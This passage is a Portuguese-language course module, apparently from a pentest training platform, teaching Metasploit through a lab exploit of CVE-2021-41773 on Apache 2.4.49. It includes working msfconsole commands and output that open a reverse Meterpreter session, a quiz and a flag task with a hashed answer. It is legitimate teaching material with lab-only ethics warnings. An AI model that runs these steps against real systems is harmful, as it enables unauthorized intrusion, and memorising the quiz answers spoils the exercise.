@@ -1,0 +1,786 @@
+---
+slug: metasploit
+track: trilha-5
+title: "Metasploit Framework do zero"
+prerequisites: [enumeracao-de-servicos]
+lab: vulhub
+tasks:
+  - slug: obter-sessao
+    title: "Abrir a sessão e fingerprintar o serviço"
+    type: flag
+    prompt: "Monte FLAG{arch-hash}: a arquitetura que o alvo reporta DENTRO da sua sessão (o que `uname -m` devolve) e os 12 primeiros caracteres do SHA-256 do binário do Apache do alvo (/usr/local/apache2/bin/httpd), calculado no próprio alvo pela sessão. Formato: FLAG{arch-hash}."
+    hint: "Depois do `exploit`, a sessão abre em segundo plano. Entre nela com `sessions -i 1` e rode `uname -m`; depois tire o SHA-256 do binário do Apache com `sha256sum /usr/local/apache2/bin/httpd` e pegue os 12 primeiros caracteres. Junte no formato FLAG{arch-hash}."
+    flag:
+      hash: "scrypt$16384$8$1$356f126439333e58c519b47e1d59eadc0055348dbb3c9ace02187fa04bd5e63c"
+      salt: "d103854839fd93f57b08c73b22427997"
+  - slug: quiz-final
+    title: "Quiz — Metasploit Framework do zero"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a diferença entre um módulo de `exploit` e um `payload` no Metasploit?"
+        options:
+          - "São sinônimos: os dois exploram a falha"
+          - "O `exploit` é a técnica que abre a porta (explora a vulnerabilidade); o `payload` é o código que roda no alvo DEPOIS que a porta abre (por exemplo, um shell ou o Meterpreter). Separá-los deixa reusar o mesmo payload com exploits diferentes"
+          - "O `exploit` roda no alvo e o `payload` roda no atacante"
+          - "O `payload` é a versão paga do `exploit`"
+        answer: 1
+        explanation: "A grande ideia do framework é desacoplar as duas coisas. O exploit é a chave que arromba a fechadura (a falha específica daquele software); o payload é o que você instala depois de entrar. Como são separados, o mesmo payload (um Meterpreter reverso, por exemplo) serve a centenas de exploits — você escolhe a falha e, independentemente, o que fazer ao entrar."
+      - question: "No fluxo `search → use → set → check → exploit`, para que serve o `check`?"
+        options:
+          - "Para baixar o exploit da internet antes de usá-lo"
+          - "Para testar, de forma leve e sem necessariamente explorar, se o alvo PARECE vulnerável àquele exploit — confirmando o vetor antes de disparar o ataque completo"
+          - "Para checar se o seu Metasploit está atualizado"
+          - "Para corrigir a vulnerabilidade no alvo"
+        answer: 1
+        explanation: "Nem todo módulo tem `check`, mas quando tem, ele é uma sonda educada: confirma a condição de vulnerabilidade (versão, uma resposta característica) sem o barulho e o risco da exploração completa. É boa prática rodar o `check` antes do `exploit` — você evita disparar contra um alvo que não é vulnerável e reduz o risco de derrubar o serviço."
+      - question: "Você vai usar um payload reverso (`reverse_tcp`). Qual endereço vai em `LHOST`?"
+        options:
+          - "O endereço do alvo (RHOSTS)"
+          - "Sempre 127.0.0.1"
+          - "O endereço da SUA máquina (o atacante), na rede que o alvo consegue alcançar — é para lá que o payload vai se conectar de volta"
+          - "O endereço do gateway da internet"
+        answer: 2
+        explanation: "Num payload reverso, quem inicia a conexão é o alvo: ele liga de volta para você. Por isso `LHOST` é o SEU endereço (onde o seu handler escuta), não o do alvo. E tem de ser o endereço que o alvo alcança — no lab, o IP do Kali na mesma rede interna do alvo, não o 127.0.0.1 (que, para o alvo, seria ele mesmo). Trocar o sentido dessa conexão é o erro nº 1 de quem começa."
+      - question: "O Meterpreter é descrito como um payload que roda \"em memória\". Por que isso importa?"
+        options:
+          - "Porque ocupa menos espaço em disco do alvo"
+          - "Porque, por rodar dentro da memória de um processo (sem precisar virar um arquivo executável no disco), ele deixa menos rastro para antivírus e perícia baseados em arquivo — e some quando o processo morre. É poderoso e furtivo, mas volátil"
+          - "Porque é mais rápido de digitar"
+          - "Porque não precisa de rede"
+        answer: 1
+        explanation: "O Meterpreter é um agente rico (navega arquivos, faz port forwarding, captura tela) que vive na memória de um processo do alvo. Não tocar o disco como executável o torna mais difícil de detectar por ferramentas que vasculham arquivos — mas também o torna volátil: reiniciou o processo, acabou a sessão (a menos que haja persistência, assunto do 6.7). Entender isso é entender por que atacantes o preferem e por que a defesa olha a memória, não só o disco."
+      - question: "Nesta attack box, o `db_status` responde `postgresql selected, no connection`. O que isso quer dizer?"
+        options:
+          - "O Metasploit está quebrado e não vai funcionar"
+          - "O Metasploit está rodando SEM banco de dados (dbless). Ele funciona assim — `search`, `use`, `exploit` e sessões operam normalmente —, mas não guarda hosts, serviços e loot entre usos nem organiza o trabalho em workspaces. O banco é uma conveniência, não um requisito"
+          - "Falta conexão com a internet para explorar o alvo"
+          - "O alvo não tem PostgreSQL instalado"
+        answer: 1
+        explanation: "O banco (PostgreSQL) dá ao Metasploit memória de longo prazo: guarda o que você enumerou, as credenciais e o loot, e separa engajamentos em workspaces. Útil, mas opcional. Dbless, você perde essa memória persistente, não a capacidade de atacar. Aqui ele roda dbless de propósito, para economizar RAM — e para você aprender que o console não depende do banco."
+      - question: "Você abriu uma sessão e o `getuid` mostra `daemon`. O que isso significa para o resto do ataque?"
+        options:
+          - "Você é dono do servidor: o ataque acabou"
+          - "`daemon` é um apelido de root no Linux"
+          - "Você executa comandos como a conta restrita do serviço web, não como root. É um foothold, não controle total: ler segredos de root ou persistir ainda exige uma etapa de privilege escalation (Trilha 6). A ferramenta ser poderosa não muda o privilégio que você herdou"
+          - "A sessão vai cair em alguns segundos"
+        answer: 2
+        explanation: "O Metasploit automatiza a exploração, mas não inventa privilégio: você herda a conta sob a qual o serviço vulnerável rodava — aqui, `daemon`, uma conta sem poder. Esse é o mesmo `daemon` do foothold na unha (5.2). Chegar a root é outra fase. Confundir \"tenho uma sessão no Metasploit\" com \"controlo a máquina\" é um erro clássico, e a ferramenta não te protege dele."
+glossary:
+  - term: Metasploit Framework
+    definition: "Plataforma aberta (da Rapid7) que reúne exploits, payloads e ferramentas de apoio num fluxo único, com um banco de módulos prontos. É o framework de exploração mais usado em pentest, tanto para atacar quanto para validar defesas."
+  - term: msfconsole
+    definition: "A interface de linha de comando principal do Metasploit: um console interativo onde se busca (`search`), seleciona (`use`), configura (`set`) e dispara (`run`/`exploit`) os módulos, e se gerencia as sessões abertas."
+  - term: Metasploit module
+    definition: "Cada unidade de funcionalidade do Metasploit, organizada por tipo: exploit, payload, auxiliary, post, encoder e nop. Um módulo tem um nome de caminho (ex.: exploit/multi/http/...) e opções próprias."
+  - term: datastore
+    definition: "O conjunto de variáveis que você define no msfconsole com `set` (RHOSTS, RPORT, LHOST, PAYLOAD...). É o estado da sua configuração atual: o módulo e o payload leem dali os valores na hora de rodar."
+  - term: handler
+    definition: "O componente do Metasploit que fica escutando pela conexão de um payload: para um payload reverso, é o handler, no atacante, que recebe a ligação do alvo e transforma em uma sessão. É o outro lado do payload."
+  - term: session
+    definition: "No Metasploit, o canal de controle sobre um alvo comprometido, aberto quando um payload conecta de volta. Pode ser um shell simples ou um Meterpreter; você lista com `sessions` e entra com `sessions -i`."
+  - term: Meterpreter
+    definition: "Payload avançado do Metasploit que roda na memória de um processo do alvo e oferece um shell rico (navegar arquivos, redirecionar portas, coletar informação) por um canal cifrado, deixando pouco rastro em disco."
+  - term: staged payload
+    definition: "Payload entregue em duas partes: um primeiro pedaço pequeno (stager) abre a conexão e baixa o resto (stage) pela rede. O oposto, o stageless, manda tudo de uma vez. O `/` no nome (meterpreter/reverse_tcp) indica o modelo em estágios."
+  - term: msfvenom
+    definition: "Ferramenta de linha de comando do Metasploit que gera payloads avulsos (um executável, um script, um shellcode) fora do console, para usar em exploits próprios ou entregar por outro caminho."
+---
+
+import arquitetura from "./img/arquitetura-do-metasploit.svg";
+import fluxoDoExploit from "./img/fluxo-do-exploit.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+No 5.1 você aprendeu a enumerar um serviço até saber exatamente o que fala naquela
+porta — produto, versão, caminhos. O passo seguinte, quando a versão é vulnerável,
+é transformar isso em acesso. Dá para fazer tudo na unha, com `curl` e muita
+leitura de boletim — e é o que os módulos 5.2 e 5.4 fazem, de propósito, para você
+ver cada byte. Mas no dia a dia de um pentest, para as falhas conhecidas, existe
+uma ferramenta que empacota esse trabalho: o
+<GlossaryTerm term="Metasploit Framework">Metasploit Framework</GlossaryTerm>, o
+arcabouço de exploração mais usado do mundo. Saber operá-lo — e, mais importante,
+entender o que ele faz por baixo — é parte do kit básico de quem testa segurança.
+
+O Metasploit tem fama de "botão mágico de hacking", e essa fama atrapalha o
+aprendizado em duas pontas. Quem o idolatra decora comandos sem entender a
+mecânica e trava no primeiro erro (um `LHOST` trocado, um payload incompatível).
+Quem o despreza perde uma ferramenta que, bem usada, é um laboratório de exploração
+inteiro: módulos de reconhecimento, exploração, pós-exploração, geração de payloads
+e um gerenciador de sessões, tudo integrado. Este módulo fica no meio: você vai
+usar o Metasploit para fazer, de forma guiada, o **mesmo** ataque que o 5.2 faz na
+mão (a CVE-2021-41773 do Apache 2.4.49), mas entendendo cada peça — o que é um
+módulo, o que é um payload, o que é uma sessão — para não ser refém da ferramenta.
+
+<Figure
+  src={arquitetura}
+  alt="Diagrama da arquitetura do Metasploit. À esquerda, a biblioteca de módulos com os seis tipos empilhados: exploit (explora a falha, abre a porta), payload (o que roda depois de entrar), auxiliary (scanners e o check, sem exploit), post (pós-exploração, na sessão), encoder (dá nova forma ao payload) e nop (preenchimento). No centro, o msfconsole, o console com que você conversa (search, use, run), que carrega esses módulos. À direita, o datastore, com as variáveis definidas via set (RHOSTS, RPORT, LHOST, PAYLOAD); dele o console combina exploit + payload e dispara contra o alvo, abrindo uma session, o canal de controle. Uma nota diz que, nesta attack box, o Metasploit roda sem banco de dados (dbless) e o search usa o cache local de módulos."
+  caption="As peças do Metasploit: o console no centro, a biblioteca de módulos à esquerda, o datastore e a sessão à direita. É esse mapa que o módulo inteiro preenche."
+/>
+
+**Ao final, você vai saber:**
+
+- explicar a arquitetura do Metasploit — módulos (exploit, payload, auxiliary,
+  post, encoder, nop), <GlossaryTerm term="datastore">datastore</GlossaryTerm>,
+  <GlossaryTerm term="handler">handler</GlossaryTerm> e
+  <GlossaryTerm term="session">sessões</GlossaryTerm> — e por que exploit e payload
+  são coisas separadas;
+- percorrer o fluxo `search → use → set → check → exploit` com segurança, lendo o
+  que cada comando mostra;
+- escolher um <GlossaryTerm term="payload">payload</GlossaryTerm> reverso, entender
+  por que `LHOST` é o seu endereço, e abrir uma sessão
+  <GlossaryTerm term="Meterpreter">Meterpreter</GlossaryTerm> contra o alvo do lab;
+- operar a sessão para coletar informação e saber o que a ferramenta **não** faz
+  por você (ela não te dá privilégio: você entra como a conta do serviço);
+- reconhecer o lado defensivo: como o uso do Metasploit aparece nos logs e no IDS.
+
+**Pré-requisitos:** 5.1 — Enumeração de serviços em profundidade (você vai partir
+da versão e da porta que enumerou lá). Este módulo **não** assume o 5.2 nem o 2.7:
+os conceitos de payload, <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm>
+e sessão são explicados do zero aqui.
+
+**Tempo estimado:** 3 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+O Metasploit dispara exploits reais. Rodá-lo contra qualquer sistema que não seja
+seu ou que você não tenha **autorização por escrito** para testar é intrusão — no
+Brasil, enquadrável no art. 154-A do Código Penal (relembre o 1.3 e o 1.4). A
+facilidade da ferramenta não muda a lei: um `exploit` a mais de distância continua
+sendo um crime se o alvo não está no seu escopo. Tudo aqui se faz **só** no
+laboratório isolado desta plataforma.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O que é o Metasploit, e por que ele existe
+
+Antes do Metasploit, explorar uma vulnerabilidade conhecida era um trabalho
+artesanal e repetitivo: para cada falha, você caçava um *proof of concept* (PoC)
+na internet, muitas vezes em C ou Python, com qualidade e confiabilidade
+duvidosas, adaptava os endereços na mão, compilava, torcia. Cada exploit trazia
+seu próprio jeito de "fazer algo depois de entrar" — abrir um shell, adicionar um
+usuário —, tudo colado no mesmo código. Não havia padrão, não havia reúso.
+
+O <GlossaryTerm term="Metasploit Framework">Metasploit Framework</GlossaryTerm>
+nasceu em 2003, criado por H.D. Moore, justamente para padronizar isso. A ideia
+central é simples e poderosa: **separar a falha do que se faz com ela**. De um
+lado, os <GlossaryTerm term="exploit">exploits</GlossaryTerm> — o código que
+explora uma vulnerabilidade específica. De outro, os
+<GlossaryTerm term="payload">payloads</GlossaryTerm> — o que roda no alvo depois
+que o exploit abre a porta. Como as duas coisas são independentes, o mesmo payload
+(digamos, um shell que liga de volta para você) serve a centenas de exploits
+diferentes. Você escolhe a fechadura a arrombar e, separadamente, o que levar para
+dentro. Essa única decisão de projeto é o que transformou exploração numa esteira
+organizada, e é a primeira coisa a entender.
+
+Em volta desse par, o framework acrescenta tudo o que um ataque precisa: módulos de
+reconhecimento, um gerador de payloads
+(<GlossaryTerm term="msfvenom">msfvenom</GlossaryTerm>), módulos de
+pós-exploração, codificadores e um gerenciador de sessões. É um laboratório de
+exploração inteiro, aberto, mantido pela Rapid7 (que adquiriu o projeto em 2009) e
+com milhares de módulos.
+
+### 2.2 Os seis tipos de módulo
+
+Tudo no Metasploit é um <GlossaryTerm term="Metasploit module">módulo</GlossaryTerm>,
+e cada módulo tem um tipo. Você reconhece o tipo pelo começo do nome
+(`exploit/...`, `auxiliary/...`). São seis, e vale saber o que cada um faz:
+
+- **exploit** — explora uma vulnerabilidade específica para conseguir execução ou
+  acesso. É o que "abre a porta". Ex.: `exploit/multi/http/apache_normalize_path_rce`.
+- **payload** — o código que roda no alvo **depois** do exploit. Pode ser um shell
+  simples ou o Meterpreter. Ex.: `payload/linux/x64/meterpreter/reverse_tcp`.
+- **auxiliary** — tarefas que **não** entregam uma sessão: scanners, fuzzers,
+  coletores, e os módulos de `check`. Enumerar sem explorar mora aqui.
+- **post** — módulos de <GlossaryTerm term="post-exploitation">pós-exploração</GlossaryTerm>,
+  que rodam **dentro** de uma sessão já aberta (coletar credenciais, pivotar). São
+  a Trilha 6 em forma de ferramenta.
+- **encoder** — dão nova forma ao payload (por exemplo, para evitar certos bytes ou
+  despistar assinaturas simples). Menos central hoje, com o avanço dos antivírus.
+- **nop** — geram sequências de "não faça nada" (*no-operation*), usadas para
+  alinhar payloads em exploits de memória.
+
+No dia a dia, você vive entre `exploit`, `payload` e `auxiliary`. Os outros três
+aparecem quando o assunto fica mais fundo.
+
+### 2.3 Payload, reverse shell e a conexão que volta
+
+Aqui está o conceito que mais confunde quem começa, então vamos devagar. Quando o
+exploit consegue fazer o alvo rodar o seu código, esse código — o payload —
+precisa te dar uma forma de controlar a máquina. A forma mais comum é um **shell**:
+um interpretador de comandos ao qual você tem acesso pela rede. Há dois sentidos
+possíveis para essa conexão:
+
+- **<GlossaryTerm term="bind shell">bind shell</GlossaryTerm>:** o alvo **abre uma
+  porta** e espera você conectar nela. Problema: firewalls costumam bloquear
+  conexões de fora para dentro, então muitas vezes não dá para alcançar essa porta.
+- **<GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm>:** o alvo
+  **liga de volta** para você. Quem inicia a conexão é a vítima, de dentro para
+  fora — e isso costuma passar, porque firewalls são bem mais permissivos com o
+  tráfego de saída. Por isso o reverse shell é o padrão.
+
+Essa inversão explica a opção que todo mundo erra. Num payload reverso
+(`reverse_tcp`), você precisa dizer ao alvo **para onde** ligar de volta: esse é o
+`LHOST` (*listener host*), o **seu** endereço — o do atacante —, e o `LPORT`, a
+porta onde você vai escutar. Do seu lado, o Metasploit sobe um
+<GlossaryTerm term="handler">handler</GlossaryTerm>: um ouvinte que recebe essa
+ligação e a transforma numa <GlossaryTerm term="session">sessão</GlossaryTerm>. Se
+você puser em `LHOST` o endereço do alvo (ou `127.0.0.1`), a ligação de volta vai
+para o lugar errado e a sessão nunca abre. Grave: **`LHOST` é você, `RHOSTS` é o
+alvo.**
+
+O payload ainda pode vir em dois modelos. Um
+<GlossaryTerm term="staged payload">staged payload</GlossaryTerm> (em estágios) manda
+primeiro um pedacinho (o *stager*), que abre a conexão e baixa o resto (o *stage*)
+pela rede — é o que o `/` no nome `meterpreter/reverse_tcp` indica. Um *stageless*
+manda tudo de uma vez (nome com `_`, como `shell_reverse_tcp`). Estágios deixam o
+payload inicial minúsculo, ao custo de uma ida e volta a mais na rede.
+
+### 2.4 Meterpreter: o payload que vale a pena entender
+
+Entre os payloads, um merece destaque: o
+<GlossaryTerm term="Meterpreter">Meterpreter</GlossaryTerm> (*Meta-Interpreter*).
+Em vez de um shell cru, ele é um agente completo que roda **na memória** de um
+processo do alvo — sem virar, necessariamente, um arquivo executável no disco — e
+conversa com você por um canal cifrado. Dentro dele você tem comandos de alto
+nível: navegar e baixar arquivos (`download`), subir arquivos (`upload`),
+redirecionar portas, ver informação do sistema (`sysinfo`), descobrir quem você é
+(`getuid`) e, quando precisa, cair num shell do sistema (`shell`).
+
+Rodar em memória tem duas consequências que você precisa saber. A boa (para o
+atacante): deixa menos rastro para antivírus e perícia que olham **arquivos**. A
+ruim (para o atacante): é **volátil** — se o processo morre, a sessão morre, a
+menos que ele estabeleça persistência (assunto do 6.7). Para a defesa, a lição é o
+espelho: não basta vasculhar o disco; é preciso olhar a memória e o
+comportamento (uma conexão de saída estranha de um processo do servidor web, por
+exemplo).
+
+### 2.5 O console, o datastore e o banco
+
+Você conversa com tudo isso pelo
+<GlossaryTerm term="msfconsole">msfconsole</GlossaryTerm>, o console interativo.
+Ele mantém um <GlossaryTerm term="datastore">datastore</GlossaryTerm>: um conjunto
+de variáveis (RHOSTS, RPORT, LHOST, PAYLOAD...) que você define com `set` e que o
+módulo lê na hora de rodar. Pense nele como o "estado" da sua configuração atual.
+
+O Metasploit pode usar um banco de dados PostgreSQL para **memória de longo
+prazo** — guardar os hosts e serviços que você enumerou, as credenciais, o loot, e
+separar engajamentos em *workspaces*. É uma conveniência e tanto, mas **não** é
+requisito: o console funciona perfeitamente *dbless* (sem banco). Nesta attack box,
+ele roda dbless de propósito, para economizar RAM — e o lab te mostra exatamente o
+que muda.
+
+## 3. Como o ataque funciona — a mecânica
+
+O fluxo de trabalho do Metasploit é quase sempre o mesmo, e cabe em cinco verbos:
+`search` (achar o módulo) → `use` (selecioná-lo) → `set` (configurar o datastore) →
+`check` (confirmar, quando dá) → `exploit` (disparar). Vamos ver cada um com o
+comando real e o que aparece na tela. O alvo é o Apache 2.4.49 do lab; do Kali, ele
+atende em `http://vulhub/`. Os endereços foram trocados por exemplos genéricos
+(`192.168.0.2` é o Kali/atacante, `192.168.0.10` é o alvo).
+
+<Figure
+  src={fluxoDoExploit}
+  alt="Diagrama de sequência com duas raias. À esquerda, o Kali com o msfconsole e LHOST 192.168.0.2; à direita, o alvo Apache 2.4.49 (vulhub). De cima para baixo: dentro do Kali, search cve:2021-41773 acha o módulo no cache local e use o seleciona; set define RHOSTS, RPORT 80 e LHOST. Uma seta do Kali ao alvo é o check, que volta com a mensagem de alvo vulnerável. Outra seta é o exploit, que envia o payload de path traversal terminando em /bin/sh; o alvo executa um programa como daemon. A seta destacada em ciano vai do alvo de volta ao Kali: a conexão reversa que abre a sessão no handler da porta 4444. Na base, uma caixa verde mostra a sessão Meterpreter aberta e os comandos getuid, uname -m e sha256 do binário do Apache que compõem a flag."
+  caption="O fluxo completo: a configuração acontece no Kali, o check e o exploit vão até o alvo, e a conexão reversa (em destaque) volta para abrir a sessão."
+/>
+
+**Passo 1 — `search`: achar o módulo.** Você sai do 5.1 sabendo a CVE. O jeito
+mais direto de encontrar o que o Metasploit tem para ela é buscar pela própria CVE:
+
+```console
+$ msfconsole -q
+msf6 > db_status
+[*] postgresql selected, no connection
+msf6 > search cve:2021-41773
+
+Matching Modules
+================
+
+   #  Full Name                                     Disclosure Date  Rank       Check  Name
+   -  ---------                                     ---------------  ----       -----  ----
+   0  exploit/multi/http/apache_normalize_path_rce  2021-05-10       excellent  Yes    Apache 2.4.49/2.4.50 Traversal RCE
+   3  auxiliary/scanner/http/apache_normalize_path  2021-05-10       normal     No     Apache 2.4.49/2.4.50 Traversal RCE scanner
+```
+
+Três colunas valem o seu olhar. O `db_status` confirma o modo *dbless* (banco
+selecionado, sem conexão) — tudo a seguir funciona assim mesmo. O **Rank**
+`excellent` é a nota de confiabilidade do módulo (do `manual` ao `excellent`):
+quanto maior, menor a chance de derrubar o alvo. E **Check `Yes`** avisa que este
+exploit sabe confirmar a vulnerabilidade sem explorar — vamos usar.
+
+**Passo 2 — `use` e `set`: selecionar e configurar o datastore.** Selecione o
+exploit e veja o que ele precisa com `show options`:
+
+```console
+msf6 > use exploit/multi/http/apache_normalize_path_rce
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS vulhub
+RHOSTS => vulhub
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
+RPORT => 80
+msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+SSL => false
+msf6 exploit(multi/http/apache_normalize_path_rce) > set CVE CVE-2021-41773
+CVE => CVE-2021-41773
+msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.0.2
+LHOST => 192.168.0.2
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+Module options (exploit/multi/http/apache_normalize_path_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CVE        CVE-2021-41773   yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013)
+   RHOSTS     vulhub           yes       The target host(s)
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.0.2      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+```
+
+Repare em três coisas. (1) Ao dar `use`, o Metasploit já escolheu um payload
+padrão: `linux/x64/meterpreter/reverse_tcp` — um Meterpreter em estágios que liga de
+volta. (2) O `show options` separa as opções **do módulo** (RHOSTS, RPORT...) das
+opções **do payload** (LHOST, LPORT) — exatamente o desacoplamento da seção 2. (3)
+Os padrões do módulo são `RPORT 443`/`SSL true`; como o nosso alvo é HTTP puro na
+porta 80, ajustamos. `LHOST` recebe o endereço do Kali na rede do alvo.
+
+**Passo 3 — `check`: confirmar antes de disparar.** Como o módulo suporta, peça a
+ele que confirme a vulnerabilidade sem explorar:
+
+```console
+msf6 exploit(multi/http/apache_normalize_path_rce) > check
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.0.10:80 - The target is vulnerable to CVE-2021-41773 (mod_cgi is enabled).
+[+] 192.168.0.10:80 - The target is vulnerable.
+```
+
+O `[+]` verde é o sinal de que vale disparar: o alvo é vulnerável **e** o
+`mod_cgi` está ligado (a condição que transforma a leitura em execução). Rodar o
+`check` antes do `exploit` é higiene: você não ataca às cegas e evita derrubar um
+serviço que nem era vulnerável.
+
+**Passo 4 — `exploit`: disparar e receber a sessão.** Agora o ataque de verdade:
+
+```console
+msf6 exploit(multi/http/apache_normalize_path_rce) > exploit
+[*] Started reverse TCP handler on 192.168.0.2:4444
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.0.10:80 - The target is vulnerable to CVE-2021-41773 (mod_cgi is enabled).
+[*] http://192.168.0.10:80 - Attempt to exploit for CVE-2021-41773
+[*] http://192.168.0.10:80 - Sending linux/x64/meterpreter/reverse_tcp command payload
+[*] Sending stage (3106788 bytes) to 192.168.0.10
+[*] Meterpreter session 1 opened (192.168.0.2:4444 -> 192.168.0.10:49124) at 2026-10-20 11:53:50 +0000
+[!] This exploit may require manual cleanup of '/tmp/KxPD' on the target
+
+meterpreter >
+```
+
+Leia a sequência, porque ela é toda a teoria em ação: o handler sobe no **seu**
+endereço (`192.168.0.2:4444`); o exploit envia o payload; o `Sending stage` é o
+segundo pedaço do payload em estágios chegando; e então **a seta vira** — a sessão
+abre como `192.168.0.2:4444 -> 192.168.0.10:49124`, ou seja, o alvo ligou de volta
+para você. O prompt muda para `meterpreter >`: você está dentro. (O aviso sobre
+`/tmp/KxPD` é o Metasploit lembrando que o exploit deixou um artefato no disco do
+alvo — um rastro, que importa na defesa e na pós-exploração.)
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### A origem: de ferramenta artesanal a padrão da indústria
+
+O Metasploit não é um projeto de nicho: é infraestrutura da área. Criado por H.D.
+Moore em 2003, começou como uma coleção de exploits em Perl; foi reescrito em Ruby
+por volta de 2007 e, em **21 de outubro de 2009**, o projeto foi adquirido pela
+Rapid7, que o mantém até hoje como ferramenta aberta. Entender sua história ajuda a
+enxergar o ponto: ele transformou exploração de um artesanato frágil num processo
+padronizado e auditável — o que serve tanto a quem ataca quanto a quem precisa
+**validar defesas** de forma repetível.
+
+- **Fonte:** [Rapid7 — Metasploit Framework](https://www.rapid7.com/products/metasploit/)
+  e o anúncio da aquisição ([Rapid7 acquires Metasploit](https://www.rapid7.com/about/press-releases/rapid7-acquires-metasploit/)).
+
+### BlueKeep: um módulo do Metasploit usado em massa (2019)
+
+O caso que melhor mostra o peso (e o duplo uso) da ferramenta é o do **BlueKeep**.
+A <GlossaryTerm term="CVE">CVE</GlossaryTerm>-2019-0708 é uma falha crítica de
+<GlossaryTerm term="remote code execution">execução remota de código</GlossaryTerm>
+no RDP (o acesso remoto do Windows), *wormable* (com potencial de se espalhar
+sozinha), com CVSS **9.8**. A Microsoft a corrigiu em **14 de maio de 2019** — a
+gravidade era tão alta que a empresa publicou patch até para sistemas fora de
+suporte, como o Windows XP.
+
+Em **6 de setembro de 2019**, a Rapid7 publicou um módulo de exploit para a
+CVE-2019-0708 no Metasploit. De propósito, o módulo **não** foi feito como um worm
+automático: ele exige que o operador especifique detalhes do alvo e identifica a
+versão antes de atacar — uma decisão para dificultar o abuso em massa. Mesmo assim,
+semanas depois o inevitável aconteceu. Por volta de **23 de outubro de 2019**, os
+*honeypots* do pesquisador Kevin Beaumont (que batizou a falha de BlueKeep)
+começaram a travar com tela azul; em **2 de novembro de 2019**, ele e o pesquisador
+Marcus Hutchins, com apoio da Microsoft, confirmaram que as quedas eram causadas
+por atacantes usando **o módulo BlueKeep do Metasploit** para instalar um minerador
+de criptomoeda (Monero) nas máquinas vulneráveis. Foi a primeira exploração em
+massa da falha registrada no mundo real.
+
+- **Impacto:** campanhas automáticas varrendo a internet atrás de RDP exposto e sem
+  patch, instalando mineradores. Ironia instrutiva: como aquele módulo **não** era
+  totalmente estável contra todos os alvos (não tinha o rank `excellent`), ele
+  travava parte das máquinas — e foi justamente esse rastro de quedas que
+  denunciou a campanha.
+- **Lição:** a publicação de um módulo no Metasploit encurta drasticamente o tempo
+  entre "existe PoC" e "há exploração em massa". Para quem defende, isso reforça a
+  urgência de aplicar patches de falhas críticas e expostas (o RDP nunca deveria
+  estar aberto para a internet). Para quem testa, é um lembrete de que o rank de um
+  módulo (seção 3) existe por um motivo real: estabilidade.
+- **Fontes:** [Microsoft Security Response Center — CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708),
+  [Rapid7 — Initial Metasploit Exploit Module for BlueKeep](https://www.rapid7.com/blog/post/2019/09/06/initial-metasploit-exploit-module-for-bluekeep-cve-2019-0708/)
+  e [Microsoft Security Blog — RDP exploits (BlueKeep) in the wild](https://www.microsoft.com/en-us/security/blog/2019/11/07/).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá usado o Metasploit para abrir uma sessão
+Meterpreter no alvo do lab (o Apache 2.4.49 da CVE-2021-41773) e, de dentro dessa
+sessão, feito o *fingerprint* do serviço para montar a flag `FLAG{arch-hash}` — a
+arquitetura que o alvo reporta e a impressão digital (SHA-256) do binário do Apache.
+
+<Callout variant="warning">
+Um laboratório ativo por vez (regra dos 16 GB). Se outro lab estiver rodando,
+pare-o antes. O alvo do `vulhub` só é alcançável de dentro do Kali, pelo nome
+`vulhub`, na rede interna — ele não tem internet e não enxerga o seu PC. **Tudo que
+o Metasploit faz aqui acontece dentro dessa rede isolada.**
+</Callout>
+
+### 5.1 Subir o laboratório e confirmar o alvo
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar** e espere
+   o desktop do Kali abrir na tela.
+2. No Kali, abra um terminal e confirme a versão do alvo (o que você fez no 5.1):
+
+```console
+$ curl -sS -I http://vulhub/ | grep -i '^Server:'
+Server: Apache/2.4.49 (Unix)
+```
+
+`Apache/2.4.49` — a versão da CVE-2021-41773. (Pela linha de comando do WSL, a
+alternativa ao painel é `scripts/lab.sh up vulhub`.)
+
+### 5.2 Abrir o msfconsole e achar o módulo (guiado)
+
+Abra o console e busque pela CVE que você já conhece:
+
+```console
+$ msfconsole -q
+msf6 > db_status
+[*] postgresql selected, no connection
+msf6 > search cve:2021-41773
+```
+
+Você verá o par de módulos da seção 3: o `exploit/multi/http/apache_normalize_path_rce`
+e o `auxiliary/scanner/http/apache_normalize_path`. O `db_status` confirma que
+estamos dbless — e tudo vai funcionar assim. Selecione o exploit:
+
+```console
+msf6 > use exploit/multi/http/apache_normalize_path_rce
+[*] Using configured payload linux/x64/meterpreter/reverse_tcp
+```
+
+Rode `show options` e leia com calma: quais opções são obrigatórias (`yes`)? Quais
+já têm valor? O que o payload padrão precisa que o módulo não precisa?
+
+### 5.3 Desafio A — configurar o datastore
+
+**Seu objetivo:** deixar o datastore pronto para este alvo. Duas opções do módulo
+têm padrões **errados** para o nosso caso, e o payload reverso precisa saber para
+onde ligar de volta. Configure RHOSTS, corrija o que estiver errado para um alvo
+HTTP na porta 80, e defina o `LHOST` certo.
+
+<Hint title="Dica 1">
+O alvo fala HTTP puro na porta 80, mas o módulo vem com `RPORT 443` e `SSL true`
+(pensados para HTTPS). Ajuste os dois. E `set RHOSTS vulhub` (pode usar o nome).
